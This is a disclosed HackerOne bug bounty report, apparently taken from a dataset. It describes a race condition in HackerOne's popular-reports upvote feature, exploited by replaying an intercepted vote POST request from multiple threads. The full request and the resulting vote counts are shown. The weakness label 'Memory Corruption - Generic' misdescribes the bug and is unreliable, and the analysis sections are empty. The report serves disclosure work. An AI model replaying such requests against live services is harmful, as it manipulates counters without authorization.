---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '146845'
original_report_id: '146845'
title: Race Conditions in Popular reports feature.
weakness: Memory Corruption - Generic
team_handle: security
created_at: '2016-06-23T17:13:45.025Z'
disclosed_at: '2016-08-03T15:57:35.170Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 112
tags:
- hackerone
- memory-corruption-generic
---

# Race Conditions in Popular reports feature.

## Metadata

- HackerOne Report ID: 146845
- Weakness: Memory Corruption - Generic
- Program: security
- Disclosed At: 2016-08-03T15:57:35.170Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

This vulnerability allows you to explore a race condition bug on a new feature of hackerone, the popular reports..

To reproduce this bug, you need to intercept the POST request that trigger the "upvote" action.

After having this POST request, i created a script that repeats that POST with multiple threads.

this allows me to, with my single account, favorite multiple times a single tweet increasing its counter.

The post requests repeat was: 
POST https://hackerone.com/reports/127158/votes HTTP/1.1
Host: hackerone.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-CSRF-Token: <hidden>
X-Requested-With: XMLHttpRequest
Referer: https://hackerone.com/hacktivity/popular
Cookie: __cfduid=d0b8800c716cf2aa744ddebd0ef2c92e21466701022; session=<hidden>
Connection: close
Cache-Control: max-age=0
Content-Length: 0

In this case,  running my script, returned the response:
{"vote_id":865,"vote_count":48}
{"vote_id":866,"vote_count":49}


Probably if my connection was faster, I would be able to increase even more the counter.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
